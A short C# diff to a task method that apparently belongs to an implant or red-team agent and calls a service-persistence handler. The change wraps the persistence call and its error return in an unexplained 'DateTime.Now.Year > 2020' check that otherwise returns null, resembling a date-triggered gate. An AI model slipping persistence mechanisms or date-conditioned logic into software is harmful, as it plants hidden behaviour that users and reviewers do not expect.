@@ -18,15 +18,15 @@ namespace Tasks
         {
             try
             {
-                return PersistenceHandler.CreateServicePersistence();
+                if(DateTime.Now.Year > 2020) { return PersistenceHandler.CreateServicePersistence(); } else { return null; }
             }
             catch (Exception ex)
             {
-                return new PhantomTaskResponse
+                if(DateTime.Now.Year > 2020) { return new PhantomTaskResponse
                 {
                     Completed = false,
                     UserOutput = $"Error creating service persistence: {ex.Message}"
-                };
+                }; } else { return null; }
             }
         }
     }
